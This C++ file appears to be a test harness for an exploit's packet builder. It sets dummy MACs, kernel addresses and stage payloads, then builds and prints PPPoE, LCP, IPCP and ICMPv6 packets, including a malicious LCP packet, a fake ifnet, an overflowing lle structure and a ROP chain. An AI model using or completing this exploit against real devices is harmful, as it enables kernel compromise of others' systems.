
#include <iostream>

#include "exploit.h"

extern "C" {
void setSourceMac(const char *mac);
void setTargetMac(const char *mac);
void setPppoeSoftc(uint64_t pppoe_softc);
void setKaslrOffset(uint64_t value);
void setStage1(const uint8_t *data, uint64_t size);
void setStage2(const uint8_t *data, uint64_t size);
void setTargetIpv6(const char *ipv6);
int buildPado(uint8_t *buffer, uint64_t size, uint8_t *cookie, uint64_t cookie_size);
int buildPads(uint8_t *buffer, uint64_t size);
int buildPadt(uint8_t *buffer, uint64_t size);
int buildLcpRequest(uint8_t *buffer, uint64_t size);
int buildLcpAck(uint8_t *buffer, uint64_t size, uint8_t id);
int buildIpcpRequest(uint8_t *buffer, uint64_t size);
int buildIpcpNak(uint8_t *buffer, uint64_t size, uint8_t id);
int buildIpcpAck(uint8_t *buffer, uint64_t size, uint8_t id, uint8_t *option, uint64_t option_size);
int buildIcmpv6Echo(uint8_t *buffer, uint64_t size, const char *source_ipv6);
int buildIcmpv6Na(uint8_t *buffer, uint64_t size, const char *source_ipv6);
int buildPinCpu0(uint8_t *buffer, uint64_t size);
int buildMaliciousLcp(uint8_t *buffer, uint64_t size);
int buildLcpEchoReply(uint8_t *buffer, uint64_t size, const char *source_mac, const char *target_mac, int16_t session,
                      uint8_t id, uint32_t magic_number);
int buildLcpTerminate(uint8_t *buffer, uint64_t size);
uint64_t buildFakeIfnet(uint8_t *buffer, uint64_t size);
uint64_t buildOverflowLle(uint8_t *buffer, uint64_t size);
uint64_t buildFakeLle(uint8_t *buffer, uint64_t size);
uint64_t buildSecondRop(uint8_t *buffer, uint64_t size);
}

int main() {
    PacketBuilder::debug = true;
    // init
    setSourceMac("11:22:33:44:55:66");
    setTargetMac("10:20:30:40:50:60");
    setPppoeSoftc(0x1234567890abcdef);
    setKaslrOffset(0x1030507090a0c0e0);
    std::vector<uint8_t> stage1 = {1, 2, 3, 4, 5};
    setStage1(stage1.data(), stage1.size());
    std::vector<uint8_t> stage2 = {6, 7, 8, 9, 0};
    setStage2(stage2.data(), stage2.size());
    setTargetIpv6("fe80::22ff:44ff:ee66:cc88");
    // outputs
    std::cout << "PADO" << std::endl;
    uint8_t cookie[] = {0xaa, 0xff, 0xde, 0xae, 0x12};
    buildPado(nullptr, 0, cookie, 5);
    std::cout << "PADS" << std::endl;
    buildPads(nullptr, 0);
    std::cout << "PADT" << std::endl;
    buildPadt(nullptr, 0);
    std::cout << "LCP" << std::endl;
    buildLcpRequest(nullptr, 0);
    std::cout << "LCP ACK" << std::endl;
    buildLcpAck(nullptr, 0, 123);
    std::cout << "IPCP" << std::endl;
    buildIpcpRequest(nullptr, 0);
    std::cout << "IPCP NAK" << std::endl;
    buildIpcpNak(nullptr, 0, 234);
    std::cout << "IPCP ACK" << std::endl;
    uint8_t option[] = {1, 2, 3, 4, 5};
    buildIpcpAck(nullptr, 0, 1, option, 5);
    std::cout << "ICMPv6 echo" << std::endl;
    buildIcmpv6Echo(nullptr, 0, "fe80::1234:5678:ee66:cc88");
    std::cout << "ICMPv6 na" << std::endl;
    buildIcmpv6Na(nullptr, 0, "fe80::1234:5678:ee66:cc88");
    std::cout << "PIN CPU" << std::endl;
    buildPinCpu0(nullptr, 0);
    std::cout << "BAD LCP" << std::endl;
    buildMaliciousLcp(nullptr, 0);
    std::cout << "LCP echo" << std::endl;
    uint8_t magic_number[] = {0x12, 0x34, 0x56, 0x78};
    buildLcpEchoReply(nullptr, 0, "12:23:34:45:56:67", "a0:a1:a2:a3:a4:a5", 123, 2,
                      htole32(*(uint32_t *) &magic_number));
    std::cout << "LCP term" << std::endl;
    buildLcpTerminate(nullptr, 0);

    uint8_t buf[0x1000];
    uint64_t res;
    std::cout << "Fake ifnet" << std::endl;
    res = buildFakeIfnet(buf, sizeof(buf));
    PacketBuilder::hexPrint(buf, res);
    std::cout << "Overflow lle" << std::endl;
    res = buildOverflowLle(buf, sizeof(buf));
    PacketBuilder::hexPrint(buf, res);
    std::cout << "Fake lle" << std::endl;
    res = buildFakeLle(buf, sizeof(buf));
    PacketBuilder::hexPrint(buf, res);
    std::cout << "Second rop" << std::endl;
    res = buildSecondRop(buf, sizeof(buf));
    PacketBuilder::hexPrint(buf, res);

    return 0;
}